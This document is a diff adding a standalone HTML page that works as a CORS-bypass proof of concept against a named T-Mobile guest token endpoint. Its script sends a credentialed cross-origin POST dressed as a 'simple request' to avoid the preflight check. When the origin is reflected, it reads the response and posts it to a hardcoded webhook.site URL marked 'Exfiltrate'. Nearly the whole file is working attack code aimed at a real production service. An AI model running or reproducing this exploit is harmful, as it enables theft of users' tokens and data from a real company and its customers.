@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Security Audit</title>
+    <style>
+        :root { --magenta: #e20074; --bg: #0b0e11; --card: #1c2128; --text: #e1e1e1; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 30px; }
+        .container { max-width: 800px; margin: auto; background: var(--card); border-radius: 12px; border-top: 6px solid var(--magenta); padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: var(--magenta); font-size: 1.4rem; margin-top: 0; }
+        .log-box { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 6px; font-family: monospace; font-size: 12px; min-height: 200px; white-space: pre-wrap; word-break: break-all; margin-top: 20px; color: #8b949e; }
+        .btn { background: var(--magenta); color: white; border: none; padding: 15px; border-radius: 6px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        .btn:hover { background: #ff0084; }
+        .success { color: #39d353 !important; }
+        .error { color: #f85149 !important; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>T-Mobile Tokens CORS Bypass</h1>
+    <p>Origin: <code id="my-origin"></code></p>
+    
+    <button class="btn" onclick="runSimpleExploit()">RUN SIMPLE REQUEST EXPLOIT</button>
+
+    <div class="log-box" id="log">Awaiting execution...</div>
+</div>
+
+<script>
+    document.getElementById('my-origin').innerText = window.location.origin;
+    const webhook = "https://webhook.site/7dedcf0e-fa4f-4dba-a805-04d37de87b08";
+
+    async function runSimpleExploit() {
+        const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
+        const log = document.getElementById('log');
+        
+        log.innerText = "Attempting Simple Request (Bypassing OPTIONS)...";
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                mode: 'cors',
+                credentials: 'include',
+                headers: {
+                    // Use text/plain to avoid the OPTIONS/Preflight 403 error
+                    'Content-Type': 'text/plain' 
+                },
+                body: "{}" // Empty JSON body
+            });
+
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            const data = await response.text();
+
+            if (acao === window.location.origin || acao === "*") {
+                log.classList.add("success");
+                log.innerText = `[REPLY RECEIVED]\nStatus: ${response.status}\nACAO Header: ${acao}\n\nDATA:\n${data}`;
+                
+                // Exfiltrate
+                fetch(webhook, { method: 'POST', mode: 'no-cors', body: data });
+            } else {
+                log.innerText = `Handshake Blocked.\nStatus: ${response.status}\nACAO: ${acao}\n\nThe server did not reflect our origin.`;
+            }
+
+        } catch (err) {
+            log.classList.add("error");
+            log.innerText = "Browser Blocked Request.\nCommon Reason: Server returned ACAO: '*' while credentials were included.\n\nCheck F12 for 'Credential is not supported' error.";
+            console.error(err);
+        }
+    }
+</script>
+
+</body>
+</html>
